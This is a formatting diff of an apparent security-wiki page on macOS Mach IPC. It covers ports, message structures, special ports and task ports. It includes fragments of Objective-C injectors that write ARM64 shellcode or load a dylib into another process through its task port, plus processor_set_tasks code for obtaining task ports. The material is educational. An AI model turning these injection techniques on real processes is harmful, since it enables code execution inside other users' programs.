@@ -1,6 +1,5 @@
 # macOS IPC - Inter Process Communication
 
-
 ## Mach messaging via Ports
 
 ### Basic Information
@@ -17,7 +16,7 @@ A process can also send a port name with some rights **to a different task** and
 
 ### Port Rights
 
-Port rights, which define what operations a task can perform, are key to this communication. The possible **port rights** are ([[https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)|definitions from here]]:
+Port rights, which define what operations a task can perform, are key to this communication. The possible **port rights** are ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):
 
 - **Receive right**, which allows receiving messages sent to the port. Mach ports are MPSC (multiple-producer, single-consumer) queues, which means that there may only ever be **one receive right for each port** in the whole system (unlike with pipes, where multiple processes can all hold file descriptors to the read end of one pipe).
   - A **task with the Receive** right can receive messages and **create Send rights**, allowing it to send messages. Originally only the **own task has Receive right over its por**t.
@@ -71,7 +70,7 @@ However, this process only applies to predefined system tasks. Non-system tasks 
 
 ### A Mach Message
 
-[[https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/|Find more info here]]
+[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
 
 The `mach_msg` function, essentially a system call, is utilized for sending and receiving Mach messages. The function requires the message to be sent as the initial argument. This message must commence with a `mach_msg_header_t` structure, succeeded by the actual message content. The structure is defined as follows:
 
@@ -85,7 +84,7 @@ typedef struct {
 	mach_msg_id_t                 msgh_id;
 } mach_msg_header_t;
 ```
-```
+
 Processes possessing a _**receive right**_ can receive messages on a Mach port. Conversely, the **senders** are granted a _**send**_ or a _**send-once right**_. The send-once right is exclusively for sending a single message, after which it becomes invalid.
 
 The initial field **`msgh_bits`** is a bitmap:
@@ -96,7 +95,7 @@ The initial field **`msgh_bits`** is a bitmap:
 - The **5 least significant bits of the 3rd byte** from can be used for **local port**
 - The **5 least significant bits of the 4th byte** from can be used for **remote port**
 
-The types that can be specified in the voucher, local and remote ports are (from [[https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)|**mach/message.h**]]:
+The types that can be specified in the voucher, local and remote ports are (from [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
 
 ```c
 #define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
@@ -110,7 +109,7 @@ The types that can be specified in the voucher, local and remote ports are (from
 #define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
 #define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
 ```
-```
+
 For example, `MACH_MSG_TYPE_MAKE_SEND_ONCE` can be used to **indicate** that a **send-once** **right** should be derived and transferred for this port. It can also be specified `MACH_PORT_NULL` to prevent the recipient to be able to reply.
 
 In order to achieve an easy **bi-directional communication** a process can specify a **mach port** in the mach **message header** called the _reply port_ (**`msgh_local_port`**) where the **receiver** of the message can **send a reply** to this message.
@@ -122,7 +121,7 @@ The other fields of the message header are:
 
 - `msgh_size`: the size of the entire packet.
 - `msgh_remote_port`: the port on which this message is sent.
-- `msgh_voucher_port`: [[https://robert.sesek.com/2023/6/mach_vouchers.html|mach vouchers]].
+- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
 - `msgh_id`: the ID of this message, which is interpreted by the receiver.
 
 > [!CAUTION]
@@ -154,7 +153,7 @@ typedef struct{
 	mach_msg_descriptor_type_t    type : 8;
 } mach_msg_type_descriptor_t;
 ```
-```
+
 In 32bits, all the descriptors are 12B and the descriptor type is in the 11th one. In 64 bits, the sizes vary.
 
 > [!CAUTION]
@@ -183,10 +182,10 @@ As the functions **`mach_msg`** and **`mach_msg_overwrite`** are the ones used t
 
 For example start debugging any application you can debug as it will load **`libSystem.B` which will use this function**.
 
-_(lldb) b mach_msg
-Breakpoint 1: where = libsystem_kernel.dylibmach_msg, address = 0x00000001803f6c20
-(lldb) r
-Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
+<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
+</strong>Breakpoint 1: where = libsystem_kernel.dylibmach_msg, address = 0x00000001803f6c20
+<strong>(lldb) r
+</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
 Process 71019 stopped
 * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
     frame #0: 0x0000000181d3ac20 libsystem_kernel.dylibmach_msg
@@ -196,8 +195,8 @@ libsystem_kernel.dylibmach_msg:
     0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
     0x181d3ac2c <+12>: add    x29, sp, #0x10
 Target 0: (SandboxedShellApp) stopped.
-(lldb) bt
-* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
+<strong>(lldb) bt
+</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
   * frame #0: 0x0000000181d3ac20 libsystem_kernel.dylibmach_msg
     frame #1: 0x0000000181ac3454 libxpc.dylib_xpc_pipe_mach_msg + 56
     frame #2: 0x0000000181ac2c8c libxpc.dylib_xpc_pipe_routine + 388
@@ -208,9 +207,9 @@ Target 0: (SandboxedShellApp) stopped.
     frame #7: 0x0000000181a9583c libxpc.dylib_libxpc_initializer + 1104
     frame #8: 0x000000018e59e6ac libSystem.B.dyliblibSystem_initializer + 236
     frame #9: 0x0000000181a1d5c8 dyldinvocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
-```
+</code></pre>
 
-To get the arguments of **`mach_msg`** check the registers. These are the arguments (from [[https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)|mach/message.h]]:
+To get the arguments of **`mach_msg`** check the registers. These are the arguments (from [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
 
 ```c
 __WATCHOS_PROHIBITED __TVOS_PROHIBITED
@@ -223,7 +222,7 @@ extern mach_msg_return_t        mach_msg(
 	mach_msg_timeout_t timeout,
 	mach_port_name_t notify);
 ```
-```
+
 Get the values from the registries:
 
 ```armasm
@@ -236,7 +235,7 @@ reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
       x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
       x6 = 0x0000000000000000 ;mach_port_name_t (notify)
 ```
-```
+
 Inspect the message header checking the first argument:
 
 ```armasm
@@ -251,7 +250,7 @@ Inspect the message header checking the first argument:
 ; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
 ; 0x40000322 -> mach_msg_id_t (msgh_id)
 ```
-```
+
 That type of `mach_msg_bits_t` is very common to allow a reply.
 
 ### Enumerate ports
@@ -279,18 +278,18 @@ Process (1) : launchd
                   +     send        --------        ---            1         <-                                       0x00002603  (74295) passd
                   [...]
 ```
-```
+
 The **name** is the default name given to the port (check how it's **increasing** in the first 3 bytes). The **`ipc-object`** is the **obfuscated** unique **identifier** of the port.\
 Note also how the ports with only **`send`** right are **identifying the owner** of it (port name + pid).\
 Also note the use of **`+`** to indicate **other tasks connected to the same port**.
 
-It's also possible to use [[https://www.newosxbook.com/tools/procexp.html|**procesxp**]] to see also the **registered service names** (with SIP disabled due to the need of `com.apple.system-task-port`):
+It's also possible to use [**procesxp**](https://www.newosxbook.com/tools/procexp.html) to see also the **registered service names** (with SIP disabled due to the need of `com.apple.system-task-port`):
 
 ```
 procesp 1 ports
 ```
-```
-You can install this tool in iOS downloading it from [[http://newosxbook.com/tools/binpack64-256.tar.gz|http://newosxbook.com/tools/binpack64-256.tar.gz]]
+
+You can install this tool in iOS downloading it from [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)
 
 ### Code example
 
@@ -317,6 +316,7 @@ int main() {
     }
     printf("mach_port_allocate() created port right name %d\n", port);
 
+
     // Give us a send right to this port, in addition to the receive right.
     kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
     if (kr != KERN_SUCCESS) {
@@ -325,6 +325,7 @@ int main() {
     }
     printf("mach_port_insert_right() inserted a send right\n");
 
+
     // Send the send right to the bootstrap server, so that it can be looked up by other processes.
     kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
     if (kr != KERN_SUCCESS) {
@@ -332,6 +333,7 @@ int main() {
         return 1;
     }
     printf("bootstrap_register()'ed our port\n");
+
 
     // Wait for a message.
     struct {
@@ -360,7 +362,6 @@ int main() {
     printf("Text: %s, number: %d\n", message.some_text, message.some_number);
 }
 ```
-```
 
 **sender.c**
 
@@ -382,6 +383,7 @@ int main() {
         return 1;
     }
     printf("bootstrap_look_up() returned port right name %d\n", port);
+
 
     // Construct our message.
     struct {
@@ -414,8 +416,6 @@ int main() {
     printf("Sent a message\n");
 }
 ```
-```
-
 
 ## Privileged Ports
 
@@ -451,7 +451,7 @@ It's possible to **see all the host special ports** by running:
 ```bash
 procexp all ports | grep "HSP"
 ```
-```
+
 ### Task Special Ports
 
 These are ports reserved for well known services. It's possible to get/set them calling `task_[get/set]_special_port`. They can be found in `task_special_ports.h`:
@@ -466,8 +466,8 @@ typedef	int	task_special_port_t;
 #define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
 #define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
 ```
-```
-From [[https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html|here]]:
+
+From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):
 
 - **TASK_KERNEL_PORT**\[task-self send right]: The port used to control this task. Used to send messages that affect the task. This is the port returned by **mach_task_self (see Task Ports below)**.
 - **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: The task's bootstrap port. Used to send messages requesting return of other system service ports.
@@ -492,7 +492,7 @@ In order to perform actions within the task, the task needed a `SEND` right to i
 - `task_[get/set]_special_port`
 - `thread_create`: Create a thread
 - `task_[get/set]_state`: Control task state
-- and more can be found in [[https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h|**mach/task.h**]]
+- and more can be found in [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)
 
 > [!CAUTION]
 > Notice that with a SEND right over a task port of a **different task**, it's possible to perform such actions over a different task.
@@ -501,7 +501,7 @@ Moreover, the task_port is also the **`vm_map`** port which allows to **read an 
 
 Remember that because the **kernel is also a task**, if someone manages to get a **SEND permissions** over the **`kernel_task`**, it'll be able to make the kernel execute anything (jailbreaks).
 
-- Call `mach_task_self()` to **get the name** for this port for the caller task. This port is only **inherited** across **`exec()`**; a new task created with `fork()` gets a new task port (as a special case, a task also gets a new task port after `exec()`in a suid binary). The only way to spawn a task and get its port is to perform the [[https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html|"port swap dance"]] while doing a `fork()`.
+- Call `mach_task_self()` to **get the name** for this port for the caller task. This port is only **inherited** across **`exec()`**; a new task created with `fork()` gets a new task port (as a special case, a task also gets a new task port after `exec()`in a suid binary). The only way to spawn a task and get its port is to perform the ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) while doing a `fork()`.
 - These are the restrictions to access the port (from `macos_task_policy` from the binary `AppleMobileFileIntegrity`):
   - If the app has **`com.apple.security.get-task-allow` entitlement** processes from the **same user can access the task port** (commonly added by Xcode for debugging). The **notarization** process won't allow it to production releases.
   - Apps with the **`com.apple.system-task-ports`** entitlement can get the **task port for any** process, except the kernel. In older versions it was called **`task_for_pid-allow`**. This is only granted to Apple applications.
@@ -559,7 +559,6 @@ processIdentifier]);
     return 0;
 }
 ```
-```
 
 **entitlements.plist**
 
@@ -567,29 +566,29 @@ processIdentifier]);
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    com.apple.security.get\-task\-allow
-    
+    <key>com.apple.security.get-task-allow</key>
+    <true/>
 </dict>
 </plist>
 ```
-```
-
 
 **Compile** the previous program and add the **entitlements** to be able to inject code with the same user (if not you will need to use **sudo**).
 
+<details>
 
 **sc\_injector.m**
-
 
 ```objectivec
 // gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
 // Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
 // and on https://newosxbook.com/src.jl?tree=listings&file=inject.c
 
+
 #import <Foundation/Foundation.h>
 #import <AppKit/AppKit.h>
 #include <mach/mach_vm.h>
 #include <sys/sysctl.h>
+
 
 #ifdef __arm64__
 
@@ -609,15 +608,18 @@ kern_return_t mach_vm_write
         mach_msg_type_number_t dataCnt
 );
 
+
 #else
 #include <mach/mach_vm.h>
 #endif
+
 
 #define STACK_SIZE 65536
 #define CODE_SIZE 128
 
 // ARM64 shellcode that executes touch /tmp/lalala
 char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";
+
 
 int inject(pid_t pid){
 
@@ -659,17 +661,20 @@ int inject(pid_t pid){
         return (-2);
     }
 
+
     // Write the shellcode to the allocated memory
     kr = mach_vm_write(remoteTask,                   // Task port
 	                   remoteCode64,                 // Virtual Address (Destination)
 	                   (vm_address_t) injectedCode,  // Source
 	                    0xa9);                       // Length of the source
 
+
     if (kr != KERN_SUCCESS)
     {
 	fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
 	return (-3);
     }
+
 
     // Set the permissions on the allocated code memory
     kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
@@ -772,14 +777,14 @@ int main(int argc, const char * argv[]) {
     return 0;
 }
 ```
-```
 
+</details>
 
 ```bash
 gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
 ./inject <pi or string>
 ```
-```
+
 > [!TIP]
 > For this to work on iOS you need the entitlement `dynamic-codesigning` in order to be able to make a writable memory executable.
 
@@ -795,9 +800,9 @@ You can find **example dylibs** in (for example the one that generates a log and
 
 [[../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md]]
 
+<details>
 
 **dylib\_injector.m**
-
 
 ```objectivec
 // gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
@@ -815,6 +820,7 @@ You can find **example dylibs** in (for example the one that generates a log and
 
 #include <sys/stat.h>
 #include <pthread.h>
+
 
 #ifdef __arm64__
 //#include "mach/arm/thread_status.h"
@@ -837,12 +843,15 @@ kern_return_t mach_vm_write
         mach_msg_type_number_t dataCnt
 );
 
+
 #else
 #include <mach/mach_vm.h>
 #endif
 
+
 #define STACK_SIZE 65536
 #define CODE_SIZE 128
+
 
 char injectedCode[] =
 
@@ -883,6 +892,7 @@ char injectedCode[] =
     "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
     "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
     "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;
+
 
 
 
@@ -936,6 +946,7 @@ int inject(pid_t pid, const char *lib) {
         return (-2);
     }
 
+
     // Patch shellcode
 
     int i = 0;
@@ -947,6 +958,7 @@ int inject(pid_t pid, const char *lib) {
         //
         extern void *_pthread_set_self;
         possiblePatchLocation++;
+
 
         uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
         uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
@@ -982,11 +994,13 @@ int inject(pid_t pid, const char *lib) {
 	                   (vm_address_t) injectedCode,  // Source
 	                    0xa9);                       // Length of the source
 
+
     if (kr != KERN_SUCCESS)
     {
         fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
         return (-3);
     }
+
 
     // Set the permissions on the allocated code memory
     kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
@@ -1005,6 +1019,7 @@ int inject(pid_t pid, const char *lib) {
         fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
         return (-4);
     }
+
 
     // Create thread to run shellcode
     struct arm_unified_thread_state remoteThreadState64;
@@ -1036,6 +1051,7 @@ int inject(pid_t pid, const char *lib) {
 }
 
 
+
 int main(int argc, const char * argv[])
 {
     if (argc < 3)
@@ -1058,14 +1074,14 @@ int main(int argc, const char * argv[])
 
 }
 ```
-```
 
+</details>
 
 ```bash
 gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 ./inject <pid-of-mysleep> </path/to/lib.dylib>
 ```
-```
+
 ### Thread Hijacking via Task port 
 
 In this technique a thread of the process is hijacked:
@@ -1104,14 +1120,14 @@ These are some interesting APIs to interact with the processor set:
 - `processor_set_stack_usage`
 - `processor_set_info`
 
-As mentioned in [[https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/|**this post**]], in the past this allowed to bypass the previously mentioned protection to get task ports in other processes to control them by calling **`processor_set_tasks`** and getting a host port on every process.\
+As mentioned in [**this post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), in the past this allowed to bypass the previously mentioned protection to get task ports in other processes to control them by calling **`processor_set_tasks`** and getting a host port on every process.\
 Nowadays you need root to use that function and this is protected so you will only be able to get these ports on unprotected processes.
 
 You can try it with:
 
+<details>
 
 ****processor\_set\_tasks code****
-
 
 ````c
 // Maincpart fo the code from https://newosxbook.com/articles/PST2.html
@@ -1190,6 +1206,7 @@ mach_port_t task_for_pid_workaround(int Pid)
 } // end workaround
 
 
+
 int main(int argc, char *argv[]) {
     /*if (argc != 2) {
         fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
@@ -1210,7 +1227,8 @@ int main(int argc, char *argv[]) {
 
 ```
 ````
-````
+
+</details>
 
 ## XPC
 
@@ -1234,13 +1252,11 @@ For more info check:
 
 ## References
 
-- [[https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html|https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html]]
-- [[https://knight.sc/malware/2019/03/15/code-injection-on-macos.html|https://knight.sc/malware/2019/03/15/code-injection-on-macos.html]]
-- [[https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a|https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a]]
-- [[https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/|https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/]]
-- [[https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/|https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/]]
-- [[https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X|\*OS Internals, Volume I, User Mode, Jonathan Levin]]
-- [[https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html|https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html]]
-
-
+- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
+- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
+- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
+- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
+- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
+- [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
+- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
 
